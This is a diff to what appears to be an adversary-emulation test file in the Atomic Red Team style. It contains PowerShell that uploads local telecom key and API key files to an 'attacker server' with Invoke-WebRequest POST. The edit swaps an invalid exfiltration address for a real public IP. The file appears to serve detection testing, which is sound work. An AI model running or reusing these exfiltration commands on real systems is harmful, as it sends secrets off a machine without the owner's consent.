@@ -194,7 +194,7 @@ atomic_tests:
         Write-Host "[*] Exfiltrating sensitive telecom data to attacker server..."
         $sim_swap_key = "C:\Temp\sim_swap_key.txt"
         $api_key = "C:\Temp\api_key.txt"
-        $exfil_url = "https://183.673.253/upload"
+        $exfil_url = "https://8.8.8.8/upload"
         Invoke-WebRequest -Uri $exfil_url -Method POST -InFile $sim_swap_key
         Invoke-WebRequest -Uri $exfil_url -Method POST -InFile $api_key
         Write-Host "[+] Sensitive data exfiltrated to attacker server"
@@ -247,6 +247,7 @@ atomic_tests:
     attack_technique:
       - T1070.001
       - T1070.004
+
 
 
 
